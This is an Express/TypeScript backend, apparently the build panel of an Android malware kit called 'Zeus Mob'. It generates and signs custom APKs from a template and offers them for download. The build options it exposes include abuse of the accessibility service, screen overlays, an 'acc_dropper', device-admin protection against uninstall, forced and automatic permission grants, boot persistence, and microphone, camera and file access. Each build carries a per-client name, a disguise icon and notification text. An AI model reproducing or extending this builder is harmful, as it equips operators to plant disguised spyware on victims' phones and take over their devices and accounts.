import { Router } from "express";
import { spawn } from "child_process";
import { execSync } from "child_process";
import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";

const router = Router();

const WORKSPACE_ROOT   = path.resolve(process.cwd(), "../..");
const ANDROID_HOME     = path.join(WORKSPACE_ROOT, ".android-sdk");
const ANDROID_SDK_ROOT = ANDROID_HOME;
const KEYSTORE_PATH    = path.join(WORKSPACE_ROOT, ".android-sdk", "debug.keystore");
const TEMPLATE_DIR     = path.join(WORKSPACE_ROOT, "android-apk-builder");

const JAVA_HOME = execSync(
  "dirname $(dirname $(readlink -f $(which java)))",
  { encoding: "utf8" }
).trim();

const SDK_BIN        = path.join(ANDROID_HOME, "cmdline-tools", "latest", "bin");
const BUILD_TOOLS    = path.join(ANDROID_HOME, "build-tools", "34.0.0");
const PLATFORM_TOOLS = path.join(ANDROID_HOME, "platform-tools");
const JAVA_BIN       = path.join(JAVA_HOME, "bin");

function buildEnv() {
  return {
    ...process.env,
    ANDROID_HOME,
    ANDROID_SDK_ROOT,
    JAVA_HOME,
    HOME: os.homedir(),
    PATH: [JAVA_BIN, SDK_BIN, BUILD_TOOLS, PLATFORM_TOOLS, process.env.PATH].join(":"),
  };
}

/** Install Android SDK if not already present. Safe to call multiple times. */
function ensureSdk(): void {
  const sdkManagerBin = path.join(SDK_BIN, "sdkmanager");

  if (!fs.existsSync(sdkManagerBin)) {
    fs.mkdirSync(path.join(ANDROID_HOME, "cmdline-tools"), { recursive: true });
    const zip = "/tmp/cmdtools-zeus.zip";
    execSync(
      `wget -q "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip" -O "${zip}"`,
      { stdio: "pipe", timeout: 120_000 }
    );
    execSync(
      `unzip -q "${zip}" -d "${path.join(ANDROID_HOME, "cmdline-tools")}" && ` +
      `mv "${path.join(ANDROID_HOME, "cmdline-tools", "cmdline-tools")}" "${path.join(ANDROID_HOME, "cmdline-tools", "latest")}"`,
      { stdio: "pipe" }
    );
    fs.rmSync(zip, { force: true });
  }

  const buildToolsDir = path.join(ANDROID_HOME, "build-tools", "34.0.0");
  if (!fs.existsSync(buildToolsDir)) {
    const env = buildEnv();
    execSync(`yes | "${sdkManagerBin}" --licenses`, { stdio: "pipe", env, timeout: 60_000 });
    execSync(
      `"${sdkManagerBin}" "platforms;android-34" "build-tools;34.0.0" "platform-tools"`,
      { stdio: "pipe", env, timeout: 180_000 }
    );
  }

  if (!fs.existsSync(KEYSTORE_PATH)) {
    fs.mkdirSync(path.dirname(KEYSTORE_PATH), { recursive: true });
    execSync(
      `"${JAVA_BIN}/keytool" -genkeypair -v ` +
      `-keystore "${KEYSTORE_PATH}" -alias androiddebugkey ` +
      `-keyalg RSA -keysize 2048 -validity 10000 ` +
      `-storepass android -keypass android ` +
      `-dname "CN=Zeus Mob,O=Zeus,C=BR" -storetype PKCS12`,
      { stdio: "pipe", timeout: 30_000 }
    );
  }
}

ensureSdk();

const PERMISSION_MAP: Record<string, string[]> = {
  accessibility: ["android.permission.BIND_ACCESSIBILITY_SERVICE"],
  app_usage:     ["android.permission.PACKAGE_USAGE_STATS"],
  draw_over:     ["android.permission.SYSTEM_ALERT_WINDOW"],
  camera:        ["android.permission.CAMERA"],
  files: [
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.WRITE_EXTERNAL_STORAGE",
  ],
  microphone: ["android.permission.RECORD_AUDIO"],
};

const BEHAVIOR_MAP: Record<string, string[]> = {
  prevent_sleep: ["android.permission.WAKE_LOCK"],
  prevent_stop: [
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
    "android.permission.RECEIVE_BOOT_COMPLETED",
  ],
  force_perms: [],
};

const ADVANCED_MAP: Record<string, string[]> = {
  acc_dropper: [],
  prevent_del: ["android.permission.BIND_DEVICE_ADMIN"],
  auto_perms:  [],
  screen_lock: [],
};

function buildManifestPermissions(selected: string[]): string {
  const perms = new Set<string>([
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.VIBRATE",
  ]);

  for (const key of selected) {
    const extra = [
      ...(PERMISSION_MAP[key] || []),
      ...(BEHAVIOR_MAP[key] || []),
      ...(ADVANCED_MAP[key] || []),
    ];
    extra.forEach(p => perms.add(p));
  }

  return [...perms].map(p => `    <uses-permission android:name="${p}" />`).join("\n");
}

function buildManifest(cfg: ApkConfig): string {
  const permissions = buildManifestPermissions([
    ...Object.keys(cfg.perms).filter(k => cfg.perms[k]),
    ...Object.keys(cfg.behavior).filter(k => cfg.behavior[k]),
    ...Object.keys(cfg.advanced).filter(k => cfg.advanced[k]),
  ]);

  const hasAccessibility = cfg.perms.accessibility;
  const hasDeviceAdmin   = cfg.advanced.prevent_del;
  const hasForeground    = cfg.behavior.prevent_stop;
  const hasScreenLock    = cfg.advanced.screen_lock;
  const hasBoot          = cfg.behavior.prevent_stop;

  return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

${permissions}

    <application
        android:name=".ZeusMobApp"
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="${cfg.appName}"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.ZeusMob"
        android:hardwareAccelerated="true"
        android:largeHeap="true"
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config"
        tools:targetApi="31">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        ${hasAccessibility ? `<service
            android:name=".service.ZeusAccessibilityService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:label="${cfg.appName} Accessibility">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>` : ""}

        ${hasForeground ? `<service
            android:name=".service.ZeusForegroundService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />` : ""}

        ${hasBoot ? `<receiver android:name=".receiver.BootReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>` : ""}

        ${hasScreenLock ? `<receiver android:name=".receiver.ScreenLockReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.SCREEN_OFF" />
                <action android:name="android.intent.action.SCREEN_ON" />
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>` : ""}

        ${hasDeviceAdmin ? `<receiver
            android:name=".receiver.ZeusDeviceAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data android:name="android.app.device_admin"
                android:resource="@xml/device_admin_config" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>` : ""}

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${cfg.appId}.provider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

    </application>
</manifest>
`;
}

function buildAppGradle(cfg: ApkConfig): string {
  const verMatch   = cfg.appVersion.match(/^([\d.]+)\s*(?:\((\d+)\))?$/);
  const versionName = verMatch ? verMatch[1] : "1.0.0";
  const versionCode = verMatch && verMatch[2] ? parseInt(verMatch[2]) : 1;
  const safeName    = cfg.appName.replace(/[^a-zA-Z0-9_]/g, "_");

  return `plugins {
    id 'com.android.application'
}

android {
    namespace 'com.zeusmob.app'
    compileSdk 34

    defaultConfig {
        applicationId "${cfg.appId}"
        minSdk 26
        targetSdk 34
        versionCode ${versionCode}
        versionName "${versionName}"
    }

    signingConfigs {
        debug {
            storeFile file("${KEYSTORE_PATH}")
            storePassword 'android'
            keyAlias 'androiddebugkey'
            keyPassword 'android'
            storeType 'PKCS12'
        }
        release {
            storeFile file("${KEYSTORE_PATH}")
            storePassword 'android'
            keyAlias 'androiddebugkey'
            keyPassword 'android'
            storeType 'PKCS12'
        }
    }

    buildTypes {
        debug {
            debuggable true
            minifyEnabled false
            signingConfig signingConfigs.debug
        }
        release {
            debuggable false
            minifyEnabled false
            signingConfig signingConfigs.release
        }
    }

    splits { abi { enable false } }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    applicationVariants.configureEach { variant ->
        variant.outputs.configureEach { output ->
            outputFileName = "${safeName}-${versionName}-release.apk"
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
    implementation 'androidx.core:core:1.12.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
}
`;
}

interface ApkConfig {
  appName: string;
  clientName: string;
  appLink: string;
  notifTitle: string;
  notifMessage: string;
  appVersion: string;
  appId: string;
  iconBase64?: string;
  perms: Record<string, boolean>;
  behavior: Record<string, boolean>;
  advanced: Record<string, boolean>;
}

// ── Job store ─────────────────────────────────────────────────────
interface BuildJob {
  status: "building" | "done" | "error";
  log: string[];
  apkPath?: string;
  apkName?: string;
  apkSize?: number;
  buildDir?: string;
  createdAt: number;
}

const jobs = new Map<string, BuildJob>();

// Clean up jobs older than 30 min
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, job] of jobs.entries()) {
    if (job.createdAt < cutoff) {
      if (job.buildDir) {
        try { fs.rmSync(job.buildDir, { recursive: true, force: true }); } catch {}
      }
      jobs.delete(id);
    }
  }
}, 5 * 60 * 1000);

// ── Async build runner ────────────────────────────────────────────
async function runBuild(jobId: string, cfg: ApkConfig): Promise<void> {
  const job = jobs.get(jobId)!;
  const buildDir = fs.mkdtempSync(path.join(os.tmpdir(), "zeus-apk-"));
  job.buildDir = buildDir;

  const addLog = (msg: string) => {
    job.log.push(msg);
    console.log(`[job:${jobId}] ${msg}`);
  };

  try {
    addLog("Copiando template Android...");
    execSync(`cp -r "${TEMPLATE_DIR}/." "${buildDir}/"`, { stdio: "pipe" });

    addLog("Configurando local.properties...");
    fs.writeFileSync(
      path.join(buildDir, "local.properties"),
      `sdk.dir=${ANDROID_HOME}\njava.home=${JAVA_HOME}\n`
    );

    addLog("Gerando AndroidManifest.xml...");
    fs.writeFileSync(
      path.join(buildDir, "app/src/main/AndroidManifest.xml"),
      buildManifest(cfg)
    );

    addLog("Gerando app/build.gradle...");
    fs.writeFileSync(
      path.join(buildDir, "app/build.gradle"),
      buildAppGradle(cfg)
    );

    addLog("Configurando strings.xml...");
    fs.writeFileSync(
      path.join(buildDir, "app/src/main/res/values/strings.xml"),
      `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${cfg.appName}</string>
    <string name="app_link">${cfg.appLink}</string>
    <string name="notif_title">${cfg.notifTitle}</string>
    <string name="notif_message">${cfg.notifMessage}</string>
    <string name="client_name">${cfg.clientName}</string>
    <string name="accessibility_service_label">${cfg.appName} Service</string>
    <string name="accessibility_service_description">Serviço ${cfg.appName} para automação e monitoramento.</string>
</resources>`
    );

    addLog("Escrevendo network_security_config.xml...");
    const xmlDir = path.join(buildDir, "app/src/main/res/xml");
    fs.mkdirSync(xmlDir, { recursive: true });
    fs.writeFileSync(
      path.join(xmlDir, "network_security_config.xml"),
      `<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>`
    );

    if (cfg.iconBase64) {
      addLog("Aplicando ícone personalizado...");
      const iconBuf = Buffer.from(
        cfg.iconBase64.replace(/^data:image\/\w+;base64,/, ""),
        "base64"
      );
      for (const d of ["mipmap-hdpi","mipmap-mdpi","mipmap-xhdpi","mipmap-xxhdpi","mipmap-xxxhdpi"]) {
        const dir = path.join(buildDir, "app/src/main/res", d);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, "ic_launcher.png"), iconBuf);
        fs.writeFileSync(path.join(dir, "ic_launcher_round.png"), iconBuf);
      }
    }

    addLog("Verificando Android SDK...");
    ensureSdk();

    addLog("Compilando com Gradle (pode levar 2–4 min)...");
    const gradleBin = execSync("which gradle", { encoding: "utf8" }).trim();

    await new Promise<void>((resolve, reject) => {
      const proc = spawn(
        gradleBin,
        ["assembleRelease", "--no-daemon", "--quiet"],
        { cwd: buildDir, env: buildEnv() }
      );

      proc.stdout.on("data", (d: Buffer) => {
        const line = d.toString().trim();
        if (line) addLog(line);
      });
      proc.stderr.on("data", (d: Buffer) => {
        const line = d.toString().trim();
        if (line) addLog(`⚠ ${line}`);
      });
      proc.on("close", (code) => {
        if (code === 0) resolve();
        else reject(new Error(`Gradle encerrou com código ${code}. Verifique os logs acima.`));
      });
      proc.on("error", (err) => reject(err));

      // Hard timeout: 8 minutes
      const timer = setTimeout(
        () => { proc.kill(); reject(new Error("Timeout: build excedeu 8 minutos")); },
        8 * 60 * 1000
      );
      proc.on("close", () => clearTimeout(timer));
    });

    addLog("Localizando APK gerado...");
    const apkDir  = path.join(buildDir, "app/build/outputs/apk/release");
    const apkFiles = fs.readdirSync(apkDir).filter(f => f.endsWith(".apk"));
    if (!apkFiles.length) throw new Error("Nenhum APK encontrado após o build");

    const apkPath = path.join(apkDir, apkFiles[0]);
    job.apkPath   = apkPath;
    job.apkName   = apkFiles[0];
    job.apkSize   = fs.statSync(apkPath).size;
    job.status    = "done";
    addLog(`✅ APK pronto: ${apkFiles[0]} (${(job.apkSize / 1024 / 1024).toFixed(1)} MB)`);

  } catch (err: any) {
    addLog(`❌ ERRO: ${err.message}`);
    job.status = "error";
    try { fs.rmSync(buildDir, { recursive: true, force: true }); } catch {}
  }
}

// ── Routes ────────────────────────────────────────────────────────

// POST /api/apk/build — inicia build em background, retorna jobId imediatamente
router.post("/apk/build", (req, res) => {
  const cfg: ApkConfig = req.body;

  if (!cfg.appId || !cfg.appName || !cfg.appVersion) {
    res.status(400).json({ error: "appId, appName e appVersion são obrigatórios" });
    return;
  }

  const jobId = crypto.randomUUID();
  jobs.set(jobId, { status: "building", log: [], createdAt: Date.now() });
  res.json({ jobId });

  // Fire and forget — não bloqueia o event loop
  runBuild(jobId, cfg).catch(() => {});
});

// GET /api/apk/status/:jobId — polling do status
router.get("/apk/status/:jobId", (req, res) => {
  const job = jobs.get(req.params.jobId);
  if (!job) {
    res.status(404).json({ error: "Job não encontrado ou expirado" });
    return;
  }
  res.json({
    status:  job.status,
    log:     job.log.join("\n"),
    apkName: job.apkName,
    apkSize: job.apkSize,
  });
});

// GET /api/apk/download/:jobId — faz download do APK
router.get("/apk/download/:jobId", (req, res) => {
  const job = jobs.get(req.params.jobId);
  if (!job || job.status !== "done" || !job.apkPath) {
    res.status(404).json({ error: "APK não disponível ou build ainda em andamento" });
    return;
  }

  res.setHeader("Content-Type", "application/vnd.android.package-archive");
  res.setHeader("Content-Disposition", `attachment; filename="${job.apkName}"`);
  res.setHeader("Content-Length", String(job.apkSize));

  const stream = fs.createReadStream(job.apkPath);
  stream.pipe(res);
  stream.on("end", () => {
    try { fs.rmSync(job.buildDir!, { recursive: true, force: true }); } catch {}
    jobs.delete(req.params.jobId);
  });
});

export default router;
